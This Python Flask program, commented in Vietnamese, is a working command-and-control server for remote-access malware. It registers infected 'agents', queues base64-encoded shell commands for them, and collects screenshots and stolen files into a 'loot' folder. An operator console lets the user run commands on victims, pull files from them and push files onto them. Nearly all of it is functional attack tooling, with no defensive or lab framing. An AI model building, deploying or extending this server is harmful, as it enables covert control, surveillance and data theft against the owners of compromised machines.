from flask import Flask, request
import random
import string
import datetime
import threading
import time
import sys
import base64
import os

# Tắt log mặc định của Flask
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Cấu trúc: {'ID': {'name': '...', 'tasks': ['lenh1', 'lenh2'], 'results': []}}
agents = {}

# Đảm bảo thư mục 'loot' tồn tại để chứa ảnh và file lấy được
if not os.path.exists('loot'):
    os.makedirs('loot')

def generate_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

# --- Hàm hỗ trợ giải mã an toàn ---
def safe_decode(data_str):
    try:
        return base64.b64decode(data_str).decode('utf-8', errors='ignore')
    except Exception:
        return f"[Raw Data] {data_str}"

# --- API ENDPOINTS ---

@app.route('/reg', methods=['POST'])
def register():
    agent_name = request.form.get('name')
    new_id = generate_id()
    agents[new_id] = {
        "name": agent_name,
        "tasks": [],
        "results": []
    }
    print(f"\n[+] New Agent: {agent_name} -> ID: {new_id}")
    return new_id, 200

@app.route('/tasks/<agent_id>', methods=['GET'])
def get_task(agent_id):
    if agent_id in agents and agents[agent_id]['tasks']:
        task = agents[agent_id]['tasks'].pop(0)
        return task, 200
    return '', 204 

@app.route('/results/<agent_id>', methods=['POST'])
def receive_result(agent_id):
    if agent_id in agents:
        encoded_output = request.form.get('result')
        if encoded_output:
            decoded = safe_decode(encoded_output)
            
            # Xử lý trường hợp nhận được ảnh chụp màn hình
            if decoded.startswith("[IMAGE] "):
                try:
                    _, img_b64 = decoded.split(" ", 1)
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"loot/shot_{agents[agent_id]['name']}_{timestamp}.png"
                    
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(img_b64))
                        
                    print(f"\n[+] Screenshot captured from {agents[agent_id]['name']}")
                    print(f"    Saved to: {filename}")
                except Exception as e:
                    print(f"\n[!] Error saving screenshot: {e}")
            
            # Xử lý trường hợp nhận được file download từ Agent
            # Cấu trúc: [FILE] <tên_file> <nội_dung_base64>
            elif decoded.startswith("[FILE] "):
                try:
                    parts = decoded.split(" ", 2)
                    filename = parts[1]
                    file_content_b64 = parts[2]
                    
                    # Lưu file vào thư mục loot
                    save_path = f"loot/{filename}"
                    with open(save_path, "wb") as f:
                        f.write(base64.b64decode(file_content_b64))
                        
                    print(f"\n[+] File downloaded successfully: {save_path}")
                except Exception as e:
                    print(f"\n[!] Error saving file: {e}")

            else:
                # In ra kết quả dạng văn bản thông thường
                print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{decoded}")
            
            print("C2 > ", end="", flush=True)
    return '', 200

# --- CLI ---

def console_thread():
    time.sleep(2) 
    print("\n=== C2 COMMAND CENTER ===")
    print("Syntax:")
    print("  set <id> <cmd>              : Chạy lệnh CMD")
    print("  set <id> screenshot         : Chụp màn hình")
    print("  set <id> download <remote>  : Tải file từ Agent về Server")
    print("  upload <id> <local> <remote>: Đẩy file từ Server xuống Agent")
    
    while True:
        try:
            user_input = input("\nC2 > ")
            if not user_input: continue
            
            parts = user_input.split(' ')
            cmd_type = parts[0]
            
            # Xử lý các lệnh set (chạy lệnh, download, screenshot)
            if cmd_type == "set" and len(parts) >= 3:
                target_id = parts[1]
                plain_task = " ".join(parts[2:])
                
                if target_id in agents:
                    # Mã hóa lệnh trước khi gửi
                    encoded_task = base64.b64encode(plain_task.encode()).decode()
                    agents[target_id]['tasks'].append(encoded_task)
                    print(f"[*] Task queued for Agent {target_id}")
                else:
                    print(f"[-] Agent ID {target_id} not found!")

            # Xử lý lệnh upload file (Server -> Agent)
            # Cú pháp: upload <id> <file_trên_server> <đường_dẫn_lưu_trên_agent>
            elif cmd_type == "upload" and len(parts) == 4:
                target_id = parts[1]
                local_path = parts[2]
                remote_path = parts[3]
                
                if target_id in agents:
                    try:
                        # Đọc file local dưới dạng binary
                        with open(local_path, "rb") as f:
                            file_content = base64.b64encode(f.read()).decode()
                        
                        # Tạo lệnh đặc biệt gửi xuống agent
                        # Cấu trúc: upload <đường_dẫn> <dữ_liệu_base64>
                        full_cmd = f"upload {remote_path} {file_content}"
                        
                        # Mã hóa toàn bộ gói tin lần cuối
                        encoded_task = base64.b64encode(full_cmd.encode()).decode()
                        agents[target_id]['tasks'].append(encoded_task)
                        
                        print(f"[*] Uploading {local_path} to {target_id}...")
                    except Exception as e:
                        print(f"[-] Error reading local file: {e}")
                else:
                    print(f"[-] Agent ID {target_id} not found!")

            elif cmd_type == "list":
                print(f"Agents: {list(agents.keys())}")
            else:
                print("Unknown command.")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    t = threading.Thread(target=console_thread, daemon=True)
    t.start()
    
    app.run(host='0.0.0.0', port=8080)